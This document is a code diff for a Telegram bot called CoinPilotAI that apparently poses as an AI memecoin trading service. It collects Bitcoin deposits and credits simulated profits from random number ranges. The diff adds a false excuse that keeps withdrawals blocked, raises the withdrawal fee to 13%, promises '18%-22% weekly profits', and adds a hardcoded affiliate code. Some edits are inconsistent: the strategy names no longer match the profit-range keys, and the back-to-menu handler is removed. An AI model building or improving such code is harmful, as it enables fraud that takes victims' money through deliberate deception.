@@ -18,7 +18,7 @@ nest_asyncio.apply()
 # ----------------------------
 running_bots = set()
 user_strategies = {}
-STRATEGIES = ["Diamond Hands", "Rocket Sniper", "FOMO Frenzy", "Shill Hunter"]
+STRATEGIES = ["LPDNY", "Cross-DEX VA", "Mean Reversion", "Shill Hunter"]
 BOT_TOKEN = os.getenv("BOT_TOKEN")
 DATA_FILE = "data.json"
 SECRET_PHRASE = "NewMexicoMouse"
@@ -28,6 +28,7 @@ DEFAULT_ADMIN_ID = 6064485557
 pending_withdrawal = {}
 pending_edit = {}
 pending_inject = {}
+pending_affiliate = {}  # <-- NEW
 admin_mode = {}
 withdraw_blocker = {}  # New: user_id -> True/False
 started_users = {}  # Tracks users who clicked start
@@ -89,7 +90,8 @@ def get_main_menu():
         [InlineKeyboardButton("Balance", callback_data="balance")],
         [InlineKeyboardButton("Deposit", callback_data="deposit"), InlineKeyboardButton("Withdrawal", callback_data="withdrawal")],
         [InlineKeyboardButton("▶️ Run", callback_data="run"), InlineKeyboardButton("⏹ Stop", callback_data="stop")],
-        [InlineKeyboardButton("Monitor", callback_data="monitor"), InlineKeyboardButton("Strategy", callback_data="strategy")],
+        [InlineKeyboardButton("Strategy", callback_data="strategy")],
+        [InlineKeyboardButton("Affiliates", callback_data="affiliates")],  # <-- NEW
         [InlineKeyboardButton("❓ Help", callback_data="help")],
         [InlineKeyboardButton("🚪 Exit", callback_data="exit")]
     ])
@@ -126,6 +128,16 @@ def get_back_main_button():
     return InlineKeyboardMarkup([[InlineKeyboardButton("⬅ Back to Main Menu", callback_data="back_main")]])
 
 # ----------------------------
+# Affiliates Menu
+# ----------------------------
+def get_affiliate_menu():
+    return InlineKeyboardMarkup([
+        [InlineKeyboardButton("Redeem Code", callback_data="redeem_code")],
+        [InlineKeyboardButton("Make a Code", callback_data="make_code")],
+        [InlineKeyboardButton("⬅ Back to Main Menu", callback_data="back_main")]
+    ])
+
+# ----------------------------
 # Handlers
 # ----------------------------
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
@@ -150,7 +162,7 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
         return
 
     if cmd == "balance":
-        await query.edit_message_text(f"*Balance:* {balance:.8f} BTC\n*Profit:* {profit:.8f} BTC", reply_markup=get_back_main_button(), parse_mode="Markdown")
+        await query.edit_message_text(f"*Balance:* {balance:.8f} BTC", reply_markup=get_back_main_button(), parse_mode="Markdown")
 
     elif cmd == "deposit":
         await query.edit_message_text(
@@ -161,7 +173,7 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
     elif cmd == "withdrawal":
         if withdraw_blocker.get(uid, False):
-            await query.edit_message_text("❌ Transaction blocked due to suspicious activity.", reply_markup=get_back_main_button())
+            await query.edit_message_text("❌ Funds are currently being deployed across liquidity pools for optimal yield. Withdrawals are temporarily disabled for 48-72 hours to prevent arbitrage exploits and ensure maximum APY for all users.", reply_markup=get_back_main_button())
         elif balance <= 0:
             await query.edit_message_text("❌ You have no balance.", reply_markup=get_back_main_button())
         else:
@@ -175,7 +187,7 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
         set_balance(uid, 0.0)
         data['users'][str(uid)]['profit'] = 0.0
         log_action(uid, "Withdrew BTC", {"net": net, "fee": fee, "address": addr})
-        await query.edit_message_text(f"✅ Sent {net:.8f} BTC to `{addr}`\n(5% fee was applied)", parse_mode="Markdown", reply_markup=get_main_menu())
+        await query.edit_message_text(f"✅ Sent {net:.8f} BTC to `{addr}`\n(13% fee was applied)", parse_mode="Markdown", reply_markup=get_main_menu())
 
     elif cmd == "cancel_withdraw":
         pending_withdrawal.pop(uid, None)
@@ -214,10 +226,23 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await query.edit_message_text(f"Strategy set to: {selected}", reply_markup=get_back_main_button())
 
     elif cmd == "help":
-        await query.edit_message_text("*Welcome to CoinPilotAI!*\n\n    This is the #1 MemeCoin Trading Bot on Telegram. We have payed out over $600,000 to users in the past 2 years. To start using our bot, you need to fund your account with Bitcoin. We only accept Bitcoin payments for faster processing & security reasons. Your Bitcoin will be converted to coins like Solana for purchasing MemeCoins. Once your account is funded, you select one of our four 100% free strategy configurations. When you select a strategy, you can start the bot and use the monitor to see what the bot is doing. The bot uses Grok AI to automate the purchase of MemeCoins. Meaning, your account will be trading MemeCoins 24/7 using AI for maximum efficiency and profits. When withdrawing funds made with the bot, CoinPilot takes a 5% cut of whatever amount you're withdrawing. We hope you have a world of success on CoinPilot! Thank You!", reply_markup=get_back_main_button(), parse_mode="Markdown")
+        await query.edit_message_text("*Welcome to CoinPilotAI!*\n\n    CoinPilotAI is a Grok powered trading bot that promises 18%-22% weekly profits. This is by far, the easiest way to start your decentralized finance journey. It's very simple to begin, start by depositing Bitcoin into your account. You can find your account details with the deposit button. Once your funds are processed, you can pick a trading strategy and start the bot right away! The bot will begin using your account funds to make small term investments at rapid rates, with precision. The team behind CoinPilotAI receives a 13% cut of every withdrawal on the platform to keep things running. \n\nGood Luck! ", reply_markup=get_back_main_button(), parse_mode="Markdown")
 
     elif cmd == "exit":
         await query.edit_message_text("Goodbye!")
+
+    # ----------------------------
+    # Affiliates Menu Handlers
+    # ----------------------------
+    elif cmd == "affiliates":
+        await query.edit_message_text("Affiliate Menu:", reply_markup=get_affiliate_menu())
+
+    elif cmd == "redeem_code":
+        pending_affiliate[uid] = "redeem"
+        await query.edit_message_text("Enter your affiliate code:", reply_markup=get_back_main_button())
+
+    elif cmd == "make_code":
+        await query.edit_message_text("You cannot make a code yet. Your CoinPilot account must be at least 7 days old, and have 1 deposit on record.", reply_markup=get_back_main_button())
 
     elif cmd.startswith("blocker_"):
         if not is_admin(uid):
@@ -270,9 +295,6 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
         admin_mode[uid] = False
         await query.edit_message_text("Admin panel closed.", reply_markup=get_back_main_button())
 
-    elif cmd == "back_main":
-        await query.edit_message_text("Main Menu:", reply_markup=get_main_menu())
-
     else:
         await query.edit_message_text("Unknown command.", reply_markup=get_back_main_button())
 
@@ -291,6 +313,17 @@ async def message_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
         else:
             await update.message.reply_text("Admin Panel Disabled")
             log_action(uid, "Admin Panel Disabled")
+        return
+
+    # ----------------------------
+    # Affiliate Code Redemption
+    # ----------------------------
+    if uid in pending_affiliate and pending_affiliate[uid] == "redeem":
+        if msg == "G7HA2N":
+            await update.message.reply_text("Code Redeemed ✅ On your next withdrawal, your transaction fee will be lowered from 13%, down to 4%.", reply_markup=get_affiliate_menu())
+        else:
+            await update.message.reply_text("Invalid Code ❌", reply_markup=get_affiliate_menu())
+        pending_affiliate.pop(uid)
         return
 
     # Withdrawal flow
@@ -352,10 +385,10 @@ async def message_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
 # Profit Loop
 # ----------------------------
 strategy_ranges = {
-    "Diamond Hands": (0.00000001, 0.0000002),
-    "Rocket Sniper": (0.00000005, 0.0000006),
-    "FOMO Frenzy": (0.0000001, 0.0000008),
-    "Shill Hunter": (0.0000003, 0.0000012)
+    "Diamond Hands": (0.00000000, 0.0000001),
+    "Rocket Sniper": (0.00000000, 0.0000001),
+    "FOMO Frenzy": (0.0000001, 0.0000002),
+    "Shill Hunter": (0.0000001, 0.0000003)
 }
 
 async def profit_loop(context: ContextTypes.DEFAULT_TYPE):
